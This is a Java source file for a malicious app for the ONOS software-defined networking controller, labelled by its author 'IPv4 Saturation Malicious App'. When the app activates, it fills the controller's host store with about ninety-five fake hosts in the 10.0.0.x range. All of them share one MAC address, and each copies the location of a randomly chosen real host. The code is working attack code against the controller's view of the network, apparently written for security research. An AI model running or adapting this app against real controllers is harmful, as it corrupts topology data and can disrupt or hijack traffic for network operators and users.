/*
 * Copyright 2022-present Open Networking Foundation
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author edoardottt, https://www.edoardoottavianelli.it/
 */

package org.ipsaturation.app;

import org.osgi.service.component.annotations.Activate;
import org.osgi.service.component.annotations.Component;
import org.osgi.service.component.annotations.Deactivate;
import org.osgi.service.component.annotations.Reference;
import org.osgi.service.component.annotations.ReferenceCardinality;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.onlab.packet.IpAddress;
import org.onlab.packet.MacAddress;
import org.onosproject.core.CoreService;
import org.onosproject.net.host.HostService;
import org.onosproject.net.host.HostStore;
import org.onosproject.net.provider.ProviderId;
import org.onosproject.net.Host;
import org.onosproject.net.HostId;
import org.onosproject.net.HostLocation;
import org.onosproject.net.device.DeviceService;
import org.onosproject.net.device.DeviceStore;
import org.onlab.packet.VlanId;
import org.onosproject.net.host.DefaultHostDescription;
import org.onosproject.net.DefaultAnnotations;

import java.util.Random;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;
import java.util.HashSet;

/**
 * IPv4 Saturation Malicious App.
 */
@Component(immediate = true)
public class IpSaturation {

    private final Logger log = LoggerFactory.getLogger(getClass());

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected CoreService coreService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostService hostService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected HostStore hostStore;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceService deviceService;

    @Reference(cardinality = ReferenceCardinality.MANDATORY)
    protected DeviceStore deviceStore;

    @Activate
    protected void activate() {
        coreService.registerApplication("org.edoardottt.ipsaturation.app", () -> log.info("Periscope down."));
        editHostStore();
        log.info("Started ipsaturation App!");
    }

    @Deactivate
    protected void deactivate() {
        log.info("Stopped ipsaturation App!");
    }

    // editHostStore mess up with the Host Data Store.
    private void editHostStore() {
        int startIp = 5;
        int ipPool = 100;
        String baseIp = "10.0.0.";

        for (int i = startIp; i < ipPool; i++) {
            String chosenIp = baseIp + String.valueOf(i);
            addHost(chosenIp);
        }
    }

    // addHost
    private void addHost(String ipAddress) {
        MacAddress mac = MacAddress.valueOf("00:00:00:00:00:10");
        Host h = pickRandomHost();
        VlanId vlan = h.vlan();
        Set<HostLocation> locations = h.locations();

        IpAddress ipA = IpAddress.valueOf(ipAddress);
        Set<IpAddress> ip = new HashSet<IpAddress>();
        ip.add(ipA);

        boolean configured = true;
        DefaultAnnotations annotations = DefaultAnnotations.builder().build();
        DefaultHostDescription hd = new DefaultHostDescription(mac, vlan, locations, ip, configured, annotations);

        ProviderId providerId = h.providerId();
        HostId hostId = HostId.hostId(mac.toString() + "0" + ipAddress.split("\\.")[3]);
        boolean replaceIps = true;
        hostStore.createOrUpdateHost(providerId, hostId, hd, replaceIps);

        log.info("Added Host {}!", ipAddress);
    }

    // pickRandomHost picks a random host
    private Host pickRandomHost() {
        Iterable<Host> hosts = hostService.getHosts();
        Random rand = new Random();
        List<Host> hostList = new ArrayList<Host>();
        hosts.forEach(hostList::add);
        Host randomHost = hostList.get(rand.nextInt(hostList.size()));

        return randomHost;
    }
}
